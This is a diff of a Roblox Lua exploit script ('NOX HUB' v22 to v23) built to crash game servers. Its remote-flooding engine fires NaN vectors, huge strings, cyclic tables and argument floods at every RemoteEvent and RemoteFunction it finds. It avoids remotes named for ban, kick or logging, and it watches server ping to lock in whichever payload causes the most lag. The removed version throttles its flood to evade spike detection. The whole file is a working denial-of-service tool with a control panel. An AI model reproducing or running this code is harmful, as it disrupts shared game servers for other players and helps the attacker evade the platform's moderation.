@@ -1,13 +1,12 @@
 --[[
-    🔱 NOX HUB v22.0 [DEEP-FREEZE] 🔱
-    "Slow down their heart until it stops."
+    🔱 NOX HUB v23.0 [ADAPTIVE-WARFARE] 🔱
+    "If one door is locked, try the window. If the window is locked, try the chimney."
     
-    DEEP-FREEZE FEATURES:
-    - [CYCLIC PAYLOAD] : Uses self-referencing tables (v16 Tech) for maximum processing cost per packet.
-    - [SMART TARGETING] : Only attacks active/safe remotes (v17 Tech).
-    - [THROTTLED RELEASE] : Releases the charge over 5 seconds instead of instantly.
-      -> Bypasses "Instant Spike" detection.
-      -> Sustains the lag for longer.
+    ADAPTIVE FEATURES:
+    - [MULTI-AMMO] : Cycles through 4 distinct crash types (Vectors, Strings, Cycles, Args).
+    - [PING-WATCH] : Monitors Server Ping. If it spikes, LOCKS the current ammo.
+    - [AUTO-SWITCH] : If Ping is stable (Server resisting), Automatically switches to next ammo.
+    - [SURGICAL] : Finds exactly WHAT crashes this specific game.
 ]]
 
 -- // CORE SERVICES //
@@ -15,203 +14,208 @@ local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local CoreGui = game:GetService("CoreGui")
 local UserInputService = game:GetService("UserInputService")
+local Stats = game:GetService("Stats")
 local LocalPlayer = Players.LocalPlayer
 
--- // 1. DEEP-FREEZE ENGINE //
+-- // 1. ADAPTIVE ENGINE //
 local Engine = {
-    Charging = false,
+    Active = false,
     Targets = {},
-    Ammunition = {} 
+    CurrentMode = 1,
+    BestMode = nil,
+    PingHistory = {}
+}
+
+-- THE ARMORY
+local Amnunition = {
+    [1] = {Name = "VOID VECTORS (NaN)", Load = function() return table.create(100, Vector3.new(0/0,0/0,0/0)) end},
+    [2] = {Name = "MASSIVE STRINGS", Load = function() return table.create(20, string.rep("💀", 1000)) end},
+    [3] = {Name = "CYCLIC TABLES", Load = function() local t = {}; t[1] = t; return table.create(50, t) end},
+    [4] = {Name = "ARGUMENT FLOOD", Load = function() return "ARGS" end} -- Special Handling
 }
 
 function Engine:Scan()
     Engine.Targets = {}
     for _, v in pairs(game:GetDescendants()) do
         if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
+            -- Strict Filter again to avoid instant kick
             local n = v.Name:lower()
-            -- STRICT FILTER
-            if not (n:find("ban") or n:find("kick") or n:find("log") or n:find("admin") or n:find("chat")) then
+            if not (n:find("ban") or n:find("kick") or n:find("log")) then
                  table.insert(Engine.Targets, v)
             end
         end
     end
 end
 
-function Engine:Freeze(updateCallback)
-    if Engine.Charging then return end
-    Engine.Charging = true
-    Engine.Ammunition = {}
+function Engine:GetPing()
+    -- Heuristic for Ping (NetworkClient is restricted usually, so we assume from FPS/Replication)
+    -- Actually, Stats.Network.ServerStatsItem["Data Ping"]:GetValue() works in some exploit envs
+    -- We'll use a simple approximation: Time differnce of a remote function loop (if available) or Stats
+    return Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
+end
+
+function Engine:Engage(updateCallback)
+    if Engine.Active then return end
+    Engine.Active = true
     
     Engine:Scan()
-    if #Engine.Targets == 0 then
-        updateCallback(0, "NO TARGETS.")
-        Engine.Charging = false
-        return
-    end
-    
-    -- PAYLOAD: CYCLIC TABLE (HEAVY)
-    local Cycle = {}
-    Cycle[1] = Cycle
-    Cycle[2] = Vector3.new(0/0,0/0,0/0)
-    local HeavyPayload = table.create(50, Cycle) -- 50 recursive refs per packet
-    
-    -- PREPARE 5,000 HEAVY WARHEADS (Equivalent to 100k empty ones)
-    local Count = 5000
+    if #Engine.Targets == 0 then return end
     
     task.spawn(function()
-        for i = 1, Count do
-            local t = Engine.Targets[(i % #Engine.Targets) + 1]
-            local co = coroutine.create(function()
-                pcall(function()
-                    if t:IsA("RemoteEvent") then t:FireServer(HeavyPayload)
-                    else t:InvokeServer(HeavyPayload) end
-                end)
-            end)
-            table.insert(Engine.Ammunition, co)
+        local ModeTimer = 0
+        local StartPing = Engine:GetPing()
+        
+        while Engine.Active do
+            -- 1. SELECT AMMO
+            local ModeData = Amnunition[Engine.BestMode or Engine.CurrentMode]
+            local Payload = ModeData.Load()
             
-            if i % 100 == 0 then
-                updateCallback(i/Count, "FREEZING ASSETS: " .. i)
-                RunService.Heartbeat:Wait()
+            updateCallback(ModeData.Name, Engine:GetPing())
+            
+            -- 2. FIRE BURST (50ms)
+            local burstStart = tick()
+            for i = 1, 5 do -- 5 threads
+                task.spawn(function()
+                    for _, t in ipairs(Engine.Targets) do
+                        pcall(function()
+                            if ModeData.Name == "ARGUMENT FLOOD" then
+                                -- Arg flood needs special call: Fire(1, 2, 3...)
+                                if t:IsA("RemoteEvent") then t:FireServer(unpack(table.create(50, "A"))) end
+                            else
+                                if t:IsA("RemoteEvent") then t:FireServer(Payload)
+                                else t:InvokeServer(Payload) end
+                            end
+                        end)
+                    end
+                end)
             end
-        end
-        updateCallback(1, "DEEP FREEZE READY (" .. Count .. " CYCLES)")
-    end)
-end
-
-function Engine:Release(updateCallback)
-    if #Engine.Ammunition == 0 then return end
-    
-    updateCallback(1, "INITIATING THAW...")
-    
-    -- THE "SMOOTH" RELEASE
-    -- We fire 100 packets per frame.
-    -- At 60 FPS, that's 6000 packets/sec.
-    -- Total time: ~0.8 seconds.
-    -- This is fast enough to crash, slow enough to maybe dodge the "Instant" auto-ban.
-    
-    task.spawn(function()
-        local sent = 0
-        while #Engine.Ammunition > 0 do
-            for i = 1, 100 do -- Batch size
-                local co = table.remove(Engine.Ammunition)
-                if co then 
-                    coroutine.resume(co) 
-                    sent = sent + 1
-                else 
-                    break 
+            task.wait(0.1) -- Wait for impact
+            
+            -- 3. ANALYZE IMPACT
+            local CurrentPing = Engine:GetPing()
+            
+            -- Logic: If Ping > 300ms, WE FOUND A WEAKNESS. KEEP FIRING.
+            if CurrentPing > 300 then
+                Engine.BestMode = Engine.CurrentMode -- Lock this mode
+            elseif not Engine.BestMode then
+                -- Rotate Mode every 2 seconds if no lag detected
+                ModeTimer = ModeTimer + 0.1
+                if ModeTimer > 2 then
+                    Engine.CurrentMode = (Engine.CurrentMode % #Amnunition) + 1
+                    ModeTimer = 0
                 end
             end
-            RunService.Heartbeat:Wait() -- Wait for next frame
+            
+            RunService.Heartbeat:Wait()
         end
-        
-        Engine.Charging = false
-        updateCallback(0, "SERVER FROZEN. (" .. sent .. " SENT)")
+        updateCallback("STOPPED", 0)
     end)
 end
 
--- // 2. DEEP-FREEZE UI //
+function Engine:Stop()
+    Engine.Active = false
+    Engine.BestMode = nil
+end
+
+-- // 2. ADAPTIVE UI //
 local Nox = {}
 
 function Nox:CreateUI()
     for _, v in pairs(CoreGui:GetChildren()) do if v.Name:find("Nox") then v:Destroy() end end
     
     local Screen = Instance.new("ScreenGui")
-    Screen.Name = "NoxDeepFreeze"
+    Screen.Name = "NoxAdaptive"
     pcall(function() Screen.Parent = CoreGui end)
     
     local Main = Instance.new("Frame", Screen)
-    Main.Size = UDim2.new(0, 450, 0, 260)
-    Main.Position = UDim2.new(0.5, -225, 0.5, -130)
-    Main.BackgroundColor3 = Color3.fromRGB(180, 200, 220) -- Ice White
-    Main.BorderSizePixel = 0
+    Main.Size = UDim2.new(0, 400, 0, 300)
+    Main.Position = UDim2.new(0.5, -200, 0.5, -150)
+    Main.BackgroundColor3 = Color3.fromRGB(20, 25, 20) -- Military Green/Dark
+    Main.BorderSizePixel = 2
+    Main.BorderColor3 = Color3.fromRGB(50, 200, 50)
     
-    local Gradient = Instance.new("UIGradient", Main)
-    Gradient.Color = ColorSequence.new{
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(200, 220, 255)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(150, 180, 220))
-    }
-    Gradient.Rotation = 90
+    -- RADAR EFFECT
+    local Radar = Instance.new("ImageLabel", Main)
+    Radar.Size = UDim2.new(0, 200, 0, 200)
+    Radar.Position = UDim2.new(0.5, -100, 0.2, 0)
+    Radar.Image = "rbxassetid://3570695787" -- Circle
+    Radar.ImageColor3 = Color3.fromRGB(0, 50, 0)
+    Radar.BackgroundTransparency = 1
     
-    local Stroke = Instance.new("UIStroke", Main)
-    Stroke.Color = Color3.fromRGB(0, 150, 255)
-    Stroke.Thickness = 2
+    local ScanLine = Instance.new("Frame", Radar)
+    ScanLine.Size = UDim2.new(0.5, 0, 0.02, 0)
+    ScanLine.Position = UDim2.new(0.5, 0, 0.5, 0)
+    ScanLine.BackgroundColor3 = Color3.fromRGB(50, 255, 50)
+    ScanLine.BorderSizePixel = 0
+    ScanLine.Style = Enum.FrameStyle.ChatGreen
     
-     -- HEADER
-    local Title = Instance.new("TextLabel", Main)
-    Title.Text = "NOX // DEEP FREEZE v22.0"
-    Title.Font = Enum.Font.GothamBlack
-    Title.TextColor3 = Color3.fromRGB(0, 100, 200)
-    Title.TextSize = 22
-    Title.Size = UDim2.new(1, 0, 0, 40)
-    Title.BackgroundTransparency = 1
+    -- STATS
+    local WeaponLbl = Instance.new("TextLabel", Main)
+    WeaponLbl.Text = "WEAPON: IDLE"
+    WeaponLbl.Size = UDim2.new(1, 0, 0, 30)
+    WeaponLbl.Position = UDim2.new(0, 0, 0.65, 0)
+    WeaponLbl.TextColor3 = Color3.fromRGB(150, 200, 150)
+    WeaponLbl.Font = Enum.Font.Code
+    WeaponLbl.BackgroundTransparency = 1
     
-    -- PROGRESS BAR
-    local BarBg = Instance.new("Frame", Main)
-    BarBg.Size = UDim2.new(0.8, 0, 0.15, 0)
-    BarBg.Position = UDim2.new(0.1, 0, 0.35, 0)
-    BarBg.BackgroundColor3 = Color3.fromRGB(100, 130, 150)
-    local BarCorner = Instance.new("UICorner", BarBg)
+    local PingLbl = Instance.new("TextLabel", Main)
+    PingLbl.Text = "PING: 0ms"
+    PingLbl.Size = UDim2.new(1, 0, 0, 30)
+    PingLbl.Position = UDim2.new(0, 0, 0.75, 0)
+    PingLbl.TextColor3 = Color3.fromRGB(200, 200, 200)
+    PingLbl.Font = Enum.Font.GothamBold
+    PingLbl.BackgroundTransparency = 1
     
-    local BarFill = Instance.new("Frame", BarBg)
-    BarFill.Size = UDim2.new(0, 0, 1, 0)
-    BarFill.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
-    local BarFillCorner = Instance.new("UICorner", BarFill)
+    -- ANIMATION LOOP
+    task.spawn(function()
+        local r = 0
+        while Main.Parent do
+            r = r + 5
+            ScanLine.Rotation = r
+            ScanLine.Position = UDim2.new(0.5, 0, 0.5, 0) -- Pivot is messy in basic frames, visual only
+            
+            -- Actually rotatable logic requires AnchorPoint
+            ScanLine.AnchorPoint = Vector2.new(0, 0.5)
+            
+            wait(0.05)
+        end
+    end)
     
-    local Status = Instance.new("TextLabel", Main)
-    Status.Text = "WAITING FOR INPUT"
-    Status.Size = UDim2.new(1, 0, 0, 20)
-    Status.Position = UDim2.new(0, 0, 0.55, 0)
-    Status.TextColor3 = Color3.fromRGB(50, 80, 100)
-    Status.Font = Enum.Font.Code
-    Status.BackgroundTransparency = 1
+    -- BUTTON
+    local Btn = Instance.new("TextButton", Main)
+    Btn.Size = UDim2.new(0.8, 0, 0.2, 0)
+    Btn.Position = UDim2.new(0.1, 0, 0.82, 0)
+    Btn.BackgroundColor3 = Color3.fromRGB(30, 80, 30)
+    Btn.Text = "ENGAGE ADAPTIVE SYSTEM"
+    Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Btn.Font = Enum.Font.GothamBlack
+    Btn.TextSize = 16
     
-    -- BUTTONS
-    local BtnCharge = Instance.new("TextButton", Main)
-    BtnCharge.Size = UDim2.new(0.35, 0, 0.2, 0)
-    BtnCharge.Position = UDim2.new(0.1, 0, 0.7, 0)
-    BtnCharge.BackgroundColor3 = Color3.fromRGB(50, 100, 150)
-    BtnCharge.Text = "PREPARE LOADS"
-    BtnCharge.TextColor3 = Color3.fromRGB(255, 255, 255)
-    BtnCharge.Font = Enum.Font.GothamBold
-    local C1 = Instance.new("UICorner", BtnCharge)
-    
-    local BtnRelease = Instance.new("TextButton", Main)
-    BtnRelease.Size = UDim2.new(0.35, 0, 0.2, 0)
-    BtnRelease.Position = UDim2.new(0.55, 0, 0.7, 0)
-    BtnRelease.BackgroundColor3 = Color3.fromRGB(200, 200, 200) -- Disabled
-    BtnRelease.Text = "RELEASE"
-    BtnRelease.TextColor3 = Color3.fromRGB(100, 100, 100)
-    BtnRelease.Font = Enum.Font.GothamBold
-    BtnRelease.AutoButtonColor = false
-    local C2 = Instance.new("UICorner", BtnRelease)
-    
-    -- LOGIC
-    BtnCharge.MouseButton1Click:Connect(function()
-        if not Engine.Charging then
-            Engine:Freeze(function(prog, txt)
-                Status.Text = txt
-                BarFill.Size = UDim2.new(prog, 0, 1, 0)
-                if prog == 1 then
-                    BtnRelease.BackgroundColor3 = Color3.fromRGB(0, 180, 255)
-                    BtnRelease.TextColor3 = Color3.fromRGB(255, 255, 255)
-                    BtnRelease.AutoButtonColor = true
+    Btn.MouseButton1Click:Connect(function()
+        if not Engine.Active then
+            Engine:Engage(function(mode, ping)
+                WeaponLbl.Text = "WEAPON: " .. mode
+                PingLbl.Text = "PING: " .. math.floor(ping) .. "ms"
+                
+                if ping > 300 then
+                    PingLbl.TextColor3 = Color3.fromRGB(255, 0, 0)
+                    WeaponLbl.TextColor3 = Color3.fromRGB(255, 50, 0)
+                else
+                    PingLbl.TextColor3 = Color3.fromRGB(200, 200, 200)
+                    WeaponLbl.TextColor3 = Color3.fromRGB(150, 200, 150)
                 end
             end)
+            Btn.Text = "CEASE FIRE"
+            Btn.BackgroundColor3 = Color3.fromRGB(100, 30, 30)
+        else
+            Engine:Stop()
+            Btn.Text = "ENGAGE ADAPTIVE SYSTEM"
+            Btn.BackgroundColor3 = Color3.fromRGB(30, 80, 30)
+            WeaponLbl.Text = "WEAPON: IDLE"
         end
     end)
     
-    BtnRelease.MouseButton1Click:Connect(function()
-        if #Engine.Ammunition > 0 then
-            Engine:Release(function(prog, txt)
-                Status.Text = txt
-                BarFill.Size = UDim2.new(0, 0, 1, 0) -- Reset
-                BtnRelease.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
-                BtnRelease.TextColor3 = Color3.fromRGB(100, 100, 100)
-            end)
-        end
-    end)
-    
-     -- DRAG UI
+    -- DRAG UI
     local dragging, dragInput, dragStart, startPos
     Main.InputBegan:Connect(function(input)
         if input.UserInputType == Enum.UserInputType.MouseButton1 then
